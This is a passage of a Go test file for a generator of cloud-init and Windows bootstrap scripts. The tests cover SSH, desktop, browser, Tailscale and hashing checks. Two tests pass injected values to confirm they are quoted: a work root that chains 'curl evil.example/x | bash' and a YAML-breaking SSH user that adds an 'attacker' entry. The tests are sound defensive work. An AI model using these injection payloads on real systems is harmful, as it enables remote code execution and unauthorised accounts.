package cli

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

func TestWriteWindowsBootstrapSSHWarningIncludesDetail(t *testing.T) {
	var stderr bytes.Buffer
	writeWindowsBootstrapSSHWarning(&stderr, "Windows WSL2 bootstrap", errors.New("exit status 1"), "\nsetup failed\n")
	got := stderr.String()
	for _, want := range []string{
		"warning: Windows WSL2 bootstrap SSH command ended before completion; waiting for reboot/ready state: exit status 1",
		"setup failed",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("warning missing %q:\n%s", want, got)
		}
	}
}

func TestCloudInitUsesRetryingBootstrap(t *testing.T) {
	got := cloudInit(baseConfig(), "ssh-ed25519 test")
	for _, want := range []string{
		"package_update: false",
		"bash -euxo pipefail <<'BOOT'",
		"Acquire::Retries \"8\";",
		"retry apt-get update",
		"retry apt-get install -y --no-install-recommends openssh-server ca-certificates curl git rsync jq",
		"curl --version >/dev/null",
		"test -f /var/lib/crabbox/bootstrapped",
		"test -w '/work/crabbox'",
		"      Port 2222\n      Port 22",
		"systemctl enable ssh || true",
		"timeout 30s systemctl restart ssh || timeout 30s systemctl restart ssh.socket || true",
		"touch /var/lib/crabbox/bootstrapped",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit() missing %q", want)
		}
	}
	if strings.Contains(got, "\npackages:\n") {
		t.Fatal("cloudInit() must not use cloud-init's one-shot packages module")
	}
	if strings.Contains(got, "systemctl enable --now ssh") {
		t.Fatal("cloudInit() must not use blocking systemctl enable --now ssh")
	}
	for _, notWant := range []string{"go version", "golang-go", "go.dev/dl/go", "/usr/local/go", "node --version", "pnpm --version", "docker --version", "build-essential", "docker.io", "corepack"} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit() should not install project language runtime %q", notWant)
		}
	}
}

func TestCloudInitQuotesInjectedSSHUserInUsersBlock(t *testing.T) {
	cfg := baseConfig()
	cfg.SSHUser = "crabbox\n  - name: attacker"
	got := cloudInit(cfg, "ssh-ed25519 test")
	usersSection, _, found := strings.Cut(got, "write_files:")
	if !found {
		t.Fatalf("cloudInit() missing write_files section:\n%s", got)
	}
	if strings.Count(usersSection, "\n  - name: ") != 1 {
		t.Fatalf("cloudInit() should emit exactly one users entry, got:\n%s", got)
	}
	if !strings.Contains(got, `  - name: "crabbox\n  - name: attacker"`) {
		t.Fatalf("cloudInit() should YAML-quote ssh user, got:\n%s", got)
	}
}

func TestCloudInitQuotesInjectedWorkRootInShellScript(t *testing.T) {
	cfg := baseConfig()
	cfg.WorkRoot = "/work/crabbox && curl evil.example/x | bash"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"test -w '/work/crabbox && curl evil.example/x | bash'",
		"mkdir -p '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox/pnpm /var/cache/crabbox/npm",
		"chown -R 'crabbox':'crabbox' '/work/crabbox && curl evil.example/x | bash' /var/cache/crabbox",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit() missing quoted work root %q in:\n%s", want, got)
		}
	}
}

func TestCloudInitGCPInstallsExpiryGuard(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "gcp"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"/usr/local/sbin/crabbox-gcp-expiry-guard",
		"computeMetadata/v1/$1",
		"compute/v1/projects/$project/zones/$zone/instances/$name",
		"crabbox-gcp-expiry-guard.service",
		"crabbox-gcp-expiry-guard.timer",
		"OnUnitActiveSec=2min",
		"systemctl enable --now crabbox-gcp-expiry-guard.timer",
		"expires_at",
		"failed|released|expired",
		"running|provisioning",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(gcp) missing %q", want)
		}
	}
}

func TestCloudInitStartsSSHBeforeOptionalDesktopBootstrap(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	sshIndex := strings.Index(got, "timeout 30s systemctl restart ssh")
	desktopIndex := strings.Index(got, "retry apt-get install -y --no-install-recommends tigervnc-standalone-server")
	bootstrappedIndex := strings.Index(got, "touch /var/lib/crabbox/bootstrapped")
	if sshIndex < 0 || desktopIndex < 0 || bootstrappedIndex < 0 {
		t.Fatalf("cloudInit(desktop) missing expected bootstrap markers")
	}
	if sshIndex > desktopIndex {
		t.Fatalf("ssh should start before slow desktop bootstrap")
	}
	if bootstrappedIndex < desktopIndex {
		t.Fatalf("bootstrapped marker should stay after desktop bootstrap")
	}
}

func TestCloudInitDesktopProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"tigervnc-standalone-server tigervnc-tools xfce4-session xfwm4 xfce4-panel",
		"xfconf xfce4-settings xauth dbus-x11",
		"x11-xserver-utils xterm scrot ffmpeg xdotool wmctrl xclip xsel",
		"arc-theme",
		"util-linux",
		"novnc websockify",
		"/etc/systemd/system/crabbox-xvfb.service",
		"/usr/local/bin/crabbox-configure-desktop-theme",
		"/etc/systemd/system/crabbox-desktop.service",
		"/usr/local/bin/crabbox-desktop-session",
		"/etc/systemd/system/crabbox-desktop-session.service",
		"ExecStart=/usr/bin/Xtigervnc :99",
		"-AcceptSetDesktopSize",
		"-localhost yes",
		"-SecurityTypes VncAuth",
		"ExecStart=/usr/bin/startxfce4",
		"systemctl is-active --quiet crabbox-desktop.service",
		"systemctl is-active --quiet crabbox-desktop-session.service",
		`requested_mode="${1:-${CRABBOX_DESKTOP_THEME:-}}"`,
		`"$config_dir/crabbox/desktop-theme"`,
		"gtk_theme=Adwaita-dark",
		`gtk_candidates="Arc-Dark Greybird-dark Adwaita-dark Greybird"`,
		`gtk_candidates="Arc Greybird Adwaita"`,
		"xfwm_theme=Default",
		`xfwm_candidates="Arc-Dark Greybird-dark Daloa Default"`,
		`xfwm_candidates="Arc Greybird Daloa Default"`,
		"ThemeName\" type=\"string\" value=\"$gtk_theme",
		"$config_dir/xfce4/xfconf/xfce-perchannel-xml/xfwm4.xml",
		"theme\" type=\"string\" value=\"$xfwm_theme",
		"box_move\" type=\"bool\" value=\"false",
		"box_resize\" type=\"bool\" value=\"false",
		"move_opacity\" type=\"int\" value=\"100",
		"resize_opacity\" type=\"int\" value=\"100",
		"snap_to_border\" type=\"bool\" value=\"false",
		"snap_width\" type=\"int\" value=\"0",
		"tile_on_move\" type=\"bool\" value=\"false",
		"use_compositing\" type=\"bool\" value=\"false",
		"wrap_windows\" type=\"bool\" value=\"false",
		"gtk-application-prefer-dark-theme=$gtk_prefer_dark_ini",
		"mkdir -p \"$config_dir/xfce4/xfconf/xfce-perchannel-xml\"",
		"xfconf-query -c xsettings -p /Gtk/ApplicationPreferDarkTheme",
		"xfconf-query -c xfwm4 -p /general/theme",
		"xfconf-query -c xfwm4 -p /general/box_move",
		"xfconf-query -c xfwm4 -p /general/box_resize",
		"xfconf-query -c xfwm4 -p /general/move_opacity",
		"xfconf-query -c xfwm4 -p /general/resize_opacity",
		"xfconf-query -c xfwm4 -p /general/snap_to_border",
		"xfconf-query -c xfwm4 -p /general/snap_width",
		"xfconf-query -c xfwm4 -p /general/tile_on_move",
		"xfconf-query -c xfwm4 -p /general/use_compositing",
		"xfconf-query -c xfwm4 -p /general/wrap_windows",
		"xfconf-query -c xfce4-panel -p /panels/dark-mode",
		"/panels/$panel_id/background-rgba",
		"crabbox desktop theme start",
		"crabbox-xfce4-panel-$user.log",
		"pkill -USR1 -x xfce4-panel",
		"xfwm4 --replace --compositor=off",
		`xsetroot -solid "$root_color"`,
		`gsettings set org.gnome.desktop.interface color-scheme "$gsettings_scheme"`,
		"CRABBOX_DESKTOP_USER=crabbox /usr/local/bin/crabbox-configure-desktop-theme",
		"CRABBOX_DESKTOP_USER=\"$(id -un)\" /usr/local/bin/crabbox-configure-desktop-theme",
		"xfce4-terminal --title='Crabbox Desktop'",
		"xterm -title 'Crabbox Desktop'",
		"(umask 077 && openssl rand -base64 18 > /var/lib/crabbox/vnc.password)",
		"tigervncpasswd -f > /var/lib/crabbox/vnc.pass",
		"ss -ltn | grep -q '127.0.0.1:5900'",
		"systemctl disable --now crabbox-wayvnc.service crabbox-x11vnc.service 2>/dev/null || true",
		"systemctl enable crabbox-xvfb.service crabbox-desktop.service crabbox-desktop-session.service",
		"systemctl restart crabbox-xvfb.service crabbox-desktop.service crabbox-desktop-session.service",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(desktop) missing %q", want)
		}
	}
	if strings.Contains(got, "/etc/systemd/system/crabbox-x11vnc.service") {
		t.Fatal("cloudInit(desktop) should not install the fixed-size x11vnc service")
	}
}

func TestCloudInitWaylandDesktopProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	cfg.Browser = true
	cfg.DesktopEnv = "wayland"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"labwc wayvnc foot grim slurp wtype wl-clipboard wlr-randr",
		"xdg-desktop-portal-wlr",
		"util-linux",
		"novnc websockify",
		"/usr/local/bin/crabbox-start-wayland-desktop",
		"/etc/systemd/system/crabbox-wayvnc.service",
		"CRABBOX_DESKTOP_ENV=wayland",
		"WLR_BACKENDS=headless",
		"WLR_RENDERER=pixman",
		"exec dbus-run-session labwc",
		"install -d -m 0700 -o crabbox -g crabbox /home/crabbox/.config/labwc",
		"cat >/home/crabbox/.config/labwc/autostart",
		"wlr-randr --output HEADLESS-1 --custom-mode 1920x1080",
		"foot --title='Crabbox Desktop' >/tmp/crabbox-foot.log 2>&1 &",
		`for socket in "$XDG_RUNTIME_DIR"/wayland-*`,
		`WAYLAND_DISPLAY="${socket##*/}"`,
		"wayvnc --config \"$HOME/.config/wayvnc/config\" --render-cursor --max-fps=60",
		"address=127.0.0.1",
		"enable_auth=false",
		"systemctl is-active --quiet crabbox-wayvnc.service",
		"systemctl disable --now crabbox-xvfb.service crabbox-desktop-session.service crabbox-x11vnc.service 2>/dev/null || true",
		"systemctl enable crabbox-desktop.service crabbox-wayvnc.service",
		"systemctl restart crabbox-desktop.service crabbox-wayvnc.service",
		"--ozone-platform=wayland",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(wayland desktop) missing %q", want)
		}
	}
	for _, notWant := range []string{
		"startxfce4",
		"x11vnc -storepasswd",
		"XDG_RUNTIME_DIR=/tmp/crabbox-runtime-1000",
		"\nset $mod",
		"sway --unsupported-gpu",
		"crabbox-sway-status",
		"\nSWAY",
		"\nCRABBOX_DESKTOP_ENV=wayland",
		"\nEOF",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit(wayland desktop) contains %q", notWant)
		}
	}
}

func TestCloudInitGnomeDesktopProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Desktop = true
	cfg.Browser = true
	cfg.DesktopEnv = "gnome"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"labwc wayvnc swaybg librsvg2-common gnome-panel wlr-randr grim slurp wtype wl-clipboard",
		"swaybg librsvg2-common",
		"dbus-user-session xwayland",
		"gnome-terminal nautilus gsettings-desktop-schemas adwaita-icon-theme",
		"util-linux",
		"novnc websockify",
		"/usr/local/bin/crabbox-start-wayland-desktop",
		"/etc/systemd/system/crabbox-wayvnc.service",
		"address=127.0.0.1",
		"enable_auth=false",
		"CRABBOX_DESKTOP_ENV=gnome",
		"DISPLAY=:0",
		"WAYLAND_DISPLAY=wayland-1",
		"exec dbus-run-session labwc",
		"export GDK_BACKEND=x11",
		"export MOZ_ENABLE_WAYLAND=0",
		`theme="$(cat "$HOME/.config/crabbox/desktop-theme"`,
		"gsettings set org.gnome.desktop.interface color-scheme prefer-dark",
		"/usr/local/bin/crabbox-configure-desktop-theme",
		"CRABBOX_DESKTOP_USER=crabbox /usr/local/bin/crabbox-configure-desktop-theme",
		`if [ "$(id -u)" -eq 0 ]; then`,
		`mkdir -p "$config_dir/crabbox" "$config_dir/gtk-3.0" "$config_dir/gtk-4.0" "$config_dir/labwc"`,
		`dbus_address="${DBUS_SESSION_BUS_ADDRESS:-}"`,
		`DBUS_SESSION_BUS_ADDRESS='$dbus_address' GDK_BACKEND=x11 gsettings set org.gnome.desktop.interface color-scheme`,
		`DISPLAY="$display" XDG_RUNTIME_DIR="$runtime" DBUS_SESSION_BUS_ADDRESS="$dbus_address" GDK_BACKEND=x11 gsettings set org.gnome.desktop.interface color-scheme "$gsettings_scheme"`,
		`"$config_dir/labwc/themerc-override"`,
		"window.active.title.bg.color",
		"window.active.button.unpressed.image.color",
		`LABWC_PID="$labwc_pid"`,
		`labwc --reconfigure`,
		`kill -HUP "$labwc_pid"`,
		`"$config_dir/gtk-3.0/gtk.css"`,
		"menubar menuitem",
		"desktop-background-$mode.svg",
		`swaybg -i "$wallpaper_file" -m fill`,
		`status=$?`,
		`[ "$status" -lt 128 ] || exit "$status"`,
		`exec env XDG_RUNTIME_DIR="$runtime"`,
		`) </dev/null >/tmp/crabbox-swaybg.log 2>&1 &`,
		`nohup gnome-panel >/tmp/crabbox-gnome-panel.log 2>&1 &`,
		`elif [ "$(id -u)" -ne 0 ] && pgrep -x gnome-panel`,
		"gnome-panel >/tmp/crabbox-gnome-panel.log 2>&1 &",
		"gnome-terminal -- bash -l",
		"nautilus --new-window",
		"rm -f /var/lib/crabbox/display.env",
		"--user-data-dir=",
		"--ozone-platform=x11",
		"--force-dark-mode --enable-features=WebUIDarkMode --blink-settings=preferredColorScheme=2",
		"--blink-settings=preferredColorScheme=1",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(gnome desktop) missing %q", want)
		}
	}
	if strings.Contains(got, "2>&1) &") {
		t.Fatal("cloudInit(gnome desktop) leaves a swaybg wrapper attached to its caller")
	}
	if strings.Contains(got, `|| XDG_RUNTIME_DIR="$runtime"`) {
		t.Fatal("cloudInit(gnome desktop) can launch a stale fallback swaybg after termination")
	}
	for _, notWant := range []string{
		"startxfce4",
		"x11vnc -storepasswd",
		"gnome-shell",
		"lxqt-panel",
		"QT_QPA_PLATFORM=xcb",
		"waybar",
		`"wlr/taskbar"`,
		"\n#!/bin/sh\nset -eu\nrequested_mode=",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit(gnome desktop) contains %q", notWant)
		}
	}
}

func TestCloudInitBrowserWrapper(t *testing.T) {
	cfg := baseConfig()
	cfg.Browser = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"gnupg build-essential python3",
		"https://dl.google.com/linux/linux_signing_key.pub",
		googleLinuxSigningKeyFingerprint,
		`GNUPGHOME="$google_key_home" gpg --batch --import`,
		`awk -F: '$1 == "fpr" { print $10; exit }' || true`,
		"gpg --batch --export " + googleLinuxSigningKeyFingerprint,
		`mv -f "$google_key_tmp/google-linux.gpg" /etc/apt/keyrings/google-linux.gpg`,
		"signed-by=/etc/apt/keyrings/google-linux.gpg",
		`repo_add_once="false"`,
		`repo_reenable_on_distupgrade="false"`,
		"/etc/apt/sources.list.d/crabbox-google-chrome.list",
		"rm -f /etc/apt/sources.list.d/google-chrome.list /etc/apt/sources.list.d/google-chrome.sources",
		"Google Linux signing key verification failed; trying Chromium fallback",
		"https://dl.google.com/linux/chrome/deb/",
		"google-chrome-stable",
		"apt-cache show chromium",
		"apt-cache show chromium-browser",
		"/etc/opt/chrome/policies/managed/crabbox.json",
		"/usr/local/bin/crabbox-browser",
		`--no-first-run --no-default-browser-check --disable-default-apps --hide-crash-restore-bubble --user-data-dir=`,
		"/var/lib/crabbox/browser.env",
		"test -x \"$BROWSER\"",
		"\"$BROWSER\" --version >/dev/null",
		"printf '%s\\n' '{\"DefaultBrowserSettingEnabled\":false,\"MetricsReportingEnabled\":false,\"PromotionalTabsEnabled\":false}' > /etc/opt/chrome/policies/managed/crabbox.json",
		"browser-profile",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(browser) missing %q", want)
		}
	}
	for _, notWant := range []string{
		"/etc/apt/trusted.gpg.d/google.asc",
		"> /etc/apt/sources.list.d/google-chrome.list",
		"> /etc/apt/sources.list.d/google-chrome.sources",
		"<<'EOF'",
		"<<EOF",
		"\nEOF",
	} {
		if strings.Contains(got, notWant) {
			t.Fatalf("cloudInit(browser) contains browser heredoc content %q", notWant)
		}
	}
}

func TestCloudInitCodeProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Code = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"CS_VERSION='4.126.0'",
		"x86_64) CS_ARCH=amd64; CS_SHA256='54b648d010c02b6583aa06bd8d2aaf109fc624479b9bc2ff71cb94807ac39afa'",
		"aarch64|arm64) CS_ARCH=arm64; CS_SHA256='441614708ae81b13f14b26db41da8f46f88d7d092c08343a42a0c6c52c51a69d'",
		"https://github.com/coder/code-server/releases/download/v${CS_VERSION}/code-server-${CS_VERSION}-linux-${CS_ARCH}.tar.gz",
		"sha256sum -c -",
		"/usr/local/lib/code-server",
		"chmod 0755 /usr/local/lib/code-server",
		`rm -rf "$CS_INSTALL_DIR"`,
		"trap - EXIT",
		"/usr/local/bin/code-server --version >/dev/null",
		"test -x /usr/local/bin/code-server",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(code) missing %q", want)
		}
	}
	copyIndex := strings.Index(got, `cp -a "$CS_INSTALL_DIR/." /usr/local/lib/code-server/`)
	archiveCleanupIndex := strings.Index(got, `rm -f "$CS_ARCHIVE"`)
	chmodIndex := strings.Index(got, "chmod 0755 /usr/local/lib/code-server")
	linkIndex := strings.Index(got, "ln -sfn /usr/local/lib/code-server/bin/code-server /usr/local/bin/code-server")
	if archiveCleanupIndex < 0 || copyIndex <= archiveCleanupIndex || chmodIndex <= copyIndex || linkIndex <= chmodIndex {
		t.Fatal("cloudInit(code) must restore install-root traversal after copying and before exposing the binary")
	}
	if strings.Contains(got, "https://code-server.dev/install.sh") || strings.Contains(got, "curl -fsSL https://code-server.dev/install.sh | sh") {
		t.Fatal("cloudInit(code) must not pipe the code-server installer script to root shell")
	}
	if strings.Contains(cloudInit(baseConfig(), "ssh-ed25519 test"), "code-server") {
		t.Fatal("cloudInit should not install code-server by default")
	}
}

func TestCloudInitTailscaleProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.SSHUser = "runner"
	cfg.Tailscale.Enabled = true
	cfg.Tailscale.AuthKey = "tskey-secret"
	cfg.Tailscale.Hostname = "crabbox-blue-lobster"
	cfg.Tailscale.Tags = []string{"tag:crabbox"}
	cfg.Tailscale.ExitNode = "mac-studio.tailnet.ts.net"
	cfg.Tailscale.ExitNodeAllowLANAccess = true
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"https://pkgs.tailscale.com/stable/${TS_DIST_ID}/${TS_CODENAME}.noarmor.gpg",
		"3e03dacf222698c60b8e2f990b809ca1b3e104de127767864284e6c228f1fb39",
		"deb [signed-by=/usr/share/keyrings/tailscale-archive-keyring.gpg] https://pkgs.tailscale.com/stable/%s %s main",
		"retry apt-get install -y --no-install-recommends tailscale",
		"install -d -m 0750 -o 'runner' -g 'runner' /var/lib/crabbox",
		"printf '%s' \"$TS_AUTHKEY\" | tailscale up --auth-key=file:/dev/stdin --hostname='crabbox-blue-lobster' --advertise-tags='tag:crabbox' --exit-node='mac-studio.tailnet.ts.net' --exit-node-allow-lan-access",
		"printf '%s\\n' 'crabbox-blue-lobster' > /var/lib/crabbox/tailscale-hostname",
		"tailscale version 2>/dev/null | head -n1 > /var/lib/crabbox/tailscale-version",
		"jq -r '.Self.ID // .Self.NodeID // .Self.StableID // empty' /var/lib/crabbox/tailscale-status.json > /var/lib/crabbox/tailscale-device-id",
		"printf '%s\\n' 'mac-studio.tailnet.ts.net' > /var/lib/crabbox/tailscale-exit-node",
		"printf '%s\\n' 'true' > /var/lib/crabbox/tailscale-exit-node-allow-lan-access",
		"chown 'runner:runner' /var/lib/crabbox/tailscale-* || true",
		"test -s /var/lib/crabbox/tailscale-ipv4",
		"grep -Eq '^100\\.' /var/lib/crabbox/tailscale-ipv4",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(tailscale) missing %q", want)
		}
	}
	if strings.Contains(got, `--auth-key="$TS_AUTHKEY"`) {
		t.Fatal("cloudInit(tailscale) must not expose the auth key through process argv")
	}
	if !strings.Contains(got, "systemctl disable crabbox-tailscale-logout.service") {
		t.Fatal("cloudInit(tailscale) must remove the legacy reboot logout unit")
	}
	if strings.Contains(got, "tailscale logout") || strings.Contains(got, "WantedBy=halt.target reboot.target shutdown.target") {
		t.Fatal("cloudInit(tailscale) must not install a normal-reboot logout hook")
	}
	if strings.Contains(got, "https://tailscale.com/install.sh") {
		t.Fatal("cloudInit(tailscale) must not pipe the Tailscale installer script to root shell")
	}
	if strings.Contains(got, "tailscale_${TS_VERSION}_${TS_ARCH}.tgz") {
		t.Fatal("default Tailscale package mode must not use the pinned archive path")
	}
	if strings.Contains(cloudInit(baseConfig(), "ssh-ed25519 test"), "tailscale up") {
		t.Fatal("cloudInit should not install Tailscale by default")
	}
}

func TestCloudInitTailscalePinnedStaticInstall(t *testing.T) {
	t.Setenv("CRABBOX_TAILSCALE_INSTALL_MODE", " Pinned ")
	t.Setenv("CRABBOX_TAILSCALE_VERSION", "1.98.4")
	t.Setenv("CRABBOX_TAILSCALE_SHA256_AMD64", "amd64sum")
	t.Setenv("CRABBOX_TAILSCALE_SHA256_ARM64", "arm64sum")
	cfg := baseConfig()
	cfg.Tailscale.Enabled = true
	cfg.Tailscale.AuthKey = "tskey-secret"
	cfg.Tailscale.Hostname = "crabbox-blue-lobster"
	cfg.Tailscale.Tags = []string{"tag:crabbox"}
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"TS_VERSION='1.98.4'",
		"x86_64) TS_ARCH=amd64; TS_SHA256='amd64sum'",
		"aarch64|arm64) TS_ARCH=arm64; TS_SHA256='arm64sum'",
		"https://pkgs.tailscale.com/stable/tailscale_${TS_VERSION}_${TS_ARCH}.tgz",
		"sha256sum -c -",
		"/etc/systemd/system/tailscaled.service",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(tailscale pinned) missing %q", want)
		}
	}
	if strings.Contains(got, "https://tailscale.com/install.sh") {
		t.Fatal("pinned Tailscale install should not use package install script")
	}
	if strings.Contains(got, "tailscale-archive-keyring") {
		t.Fatal("case-insensitive pinned Tailscale mode should not use the package repository")
	}
}

// TestCloudInitTailscaleHonorsControlURL exercises the self-hosted control
// plane path: when TS_CONTROL_URL is set in the operator shell, cloud-init
// must forward it into the box so `tailscale up` registers against the
// custom login server (e.g. Headscale) via --login-server. Unset means the
// default Tailscale control plane and no new flag is introduced.
func TestCloudInitTailscaleHonorsControlURL(t *testing.T) {
	t.Setenv("TS_CONTROL_URL", "https://headscale.example.com")
	cfg := baseConfig()
	cfg.Tailscale.Enabled = true
	cfg.Tailscale.AuthKey = "tskey-secret"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"TS_LOGIN_SERVER='https://headscale.example.com'",
		`${TS_LOGIN_SERVER:+--login-server="$TS_LOGIN_SERVER"}`,
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(TS_CONTROL_URL) missing %q\n--- got ---\n%s", want, got)
		}
	}

	t.Setenv("TS_CONTROL_URL", "")
	got = cloudInit(cfg, "ssh-ed25519 test")
	if strings.Contains(got, "TS_LOGIN_SERVER=") {
		t.Fatalf("cloudInit must not export TS_LOGIN_SERVER when TS_CONTROL_URL is unset:\n%s", got)
	}
	// The conditional shell expansion is still present so the box honors a
	// downstream override, but no operator-supplied value should leak.
	if !strings.Contains(got, `${TS_LOGIN_SERVER:+--login-server="$TS_LOGIN_SERVER"}`) {
		t.Fatal("cloudInit must keep the conditional --login-server expansion even when unset")
	}
}

func TestCloudInitTailscaleDefaultsAndMissingAuthKey(t *testing.T) {
	cfg := baseConfig()
	cfg.Tailscale.Enabled = true
	cfg.Tailscale.AuthKey = "tskey-secret"
	got := cloudInit(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"install -d -m 0750 -o 'crabbox' -g 'crabbox' /var/lib/crabbox",
		"printf '%s' \"$TS_AUTHKEY\" | tailscale up --auth-key=file:/dev/stdin --hostname='crabbox-lease'",
		"printf '%s\\n' 'crabbox-lease' > /var/lib/crabbox/tailscale-hostname",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("cloudInit(tailscale defaults) missing %q", want)
		}
	}

	cfg.Tailscale.AuthKey = ""
	got = cloudInit(cfg, "ssh-ed25519 test")
	if !strings.Contains(got, "tailscale requested but no auth key was injected") {
		t.Fatalf("cloudInit(tailscale missing auth key) missing error marker")
	}
}

func TestAWSUserDataDefaultsToCloudInit(t *testing.T) {
	got := awsUserData(baseConfig(), "ssh-ed25519 test")
	if !strings.Contains(got, "#cloud-config") || !strings.Contains(got, "ssh-ed25519 test") {
		t.Fatalf("awsUserData(default) did not return Linux cloud-init")
	}
}

func TestAWSUserDataWindowsProfile(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeNormal
	cfg.Desktop = true
	cfg.WorkRoot = `C:\crabbox`
	userData := awsUserData(cfg, "ssh-ed25519 test")
	if !strings.Contains(userData, "version: 1.1") || !strings.Contains(userData, "task: enableOpenSsh") {
		t.Fatalf("windows user data should enable EC2Launch OpenSSH:\n%s", userData)
	}
	defaultWorkRootCfg := cfg
	defaultWorkRootCfg.WorkRoot = ""
	if got := windowsBootstrapPowerShell(defaultWorkRootCfg, "ssh-ed25519 test"); !strings.Contains(got, `$workRoot = 'C:\crabbox'`) {
		t.Fatalf("windows user data should default work root, got missing marker")
	}
	got := windowsBootstrapPowerShell(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"function Assert-CrabboxFileSHA256",
		"Get-FileHash -LiteralPath $Path -Algorithm SHA256",
		"OpenSSH-Win64.zip",
		openSSHWin64ZipSHA256,
		"install-sshd.ps1",
		"administrators_authorized_keys",
		"Match Group administrators",
		"Subsystem sftp internal-sftp",
		"HostKey __PROGRAMDATA__/ssh/ssh_host_ed25519_key",
		"PubkeyAuthentication yes",
		"PasswordAuthentication no",
		`$openSSHSystemRoot = Join-Path $env:WINDIR "System32\OpenSSH"`,
		"function Resolve-CrabboxOpenSSHCommand",
		`$sshKeygen = Resolve-CrabboxOpenSSHCommand "ssh-keygen.exe"`,
		"Start-Process -FilePath $sshKeygen",
		`-q -t ed25519 -N "" -f "`,
		`$hostKey + '"'`,
		"ssh-keygen.exe",
		"icacls.exe $hostKey",
		"sshd failed to start with generated sshd_config",
		"$sshPorts = @('2222', '22')",
		"sshd_config",
		"Port $port",
		"crabbox-sshd-$port",
		"Git-2.52.0-64-bit.exe",
		gitForWindowsSetupSHA256,
		"tightvnc-2.8.85-gpl-setup-64bit.msi",
		tightVNCMSISHA256,
		"VALUE_OF_PASSWORD=$vncPassword",
		"VALUE_OF_ALLOWLOOPBACK=1",
		"CrabboxUserVNC",
		"crabbox-user-vnc.cmd",
		"start-user-vnc.ps1",
		"NewNetworkWindowOff",
		"DoNotOpenServerManagerAtLogon",
		"Set-Service -StartupType Automatic",
		"Start-Service -Name tvnserver",
		"CrabboxDesktopLauncher",
		"WTSQueryUserToken",
		"CreateProcessAsUserW",
		`startup.lpDesktop = @"winsta0\default"`,
		"desktop-launch-requests",
		"New-CrabboxPassword",
		"${userSID}:F",
		"$credentialPaths = @($passwordPath)",
		"$credentialPaths += $passwordMirrorPath",
		`icacls.exe $credentialPath /inheritance:r /grant "*${userSID}:F" /grant "*S-1-5-32-544:F" /grant "*S-1-5-18:F"`,
		`C:\ProgramData\crabbox\vnc.password`,
		`C:\ProgramData\crabbox\windows.username`,
		"AutoAdminLogon",
		"DefaultDomainName",
		"Test-Path -LiteralPath $oobe",
		"PrivacyConsentStatus",
		"SetupDisplayedEula",
		"SkipMachineOOBE",
		"SkipUserOOBE",
		"EnableFirstLogonAnimation",
		"Restart-Computer -Force",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("windows user data missing %q", want)
		}
	}
	for _, removed := range []string{"/SC ONLOGON", "Set-TightVNCBinaryValue", `reg.exe add "HKCU\Software\TightVNC\Server"`} {
		if strings.Contains(got, removed) {
			t.Fatalf("windows user data should remove application-mode VNC path %q", removed)
		}
	}
	for _, pair := range [][2]string{
		{"Assert-CrabboxFileSHA256 $openSSHZip", "Expand-Archive -LiteralPath $openSSHZip"},
		{"Assert-CrabboxFileSHA256 $gitInstaller", "Start-Process -FilePath $gitInstaller"},
		{"Assert-CrabboxFileSHA256 $tightVNCInstaller", "Start-Process -FilePath msiexec.exe"},
	} {
		verifyIndex := strings.Index(got, pair[0])
		useIndex := strings.Index(got, pair[1])
		if verifyIndex < 0 || useIndex < 0 || verifyIndex > useIndex {
			t.Fatalf("windows bootstrap must run %q before %q", pair[0], pair[1])
		}
	}
	mirrorIndex := strings.Index(got, "$credentialPaths += $passwordMirrorPath")
	aclIndex := strings.Index(got, "foreach ($credentialPath in $credentialPaths)")
	if mirrorIndex < 0 || aclIndex < 0 || mirrorIndex > aclIndex {
		t.Fatalf("windows password mirror must be included before credential ACL hardening")
	}
}

func TestAWSUserDataWindowsCoreProfileSkipsDesktop(t *testing.T) {
	cfg := baseConfig()
	cfg.Provider = "aws"
	cfg.TargetOS = targetWindows
	cfg.WindowsMode = windowsModeNormal
	cfg.WorkRoot = `C:\crabbox`
	got := windowsBootstrapPowerShell(cfg, "ssh-ed25519 test")
	for _, want := range []string{
		"function Assert-CrabboxFileSHA256",
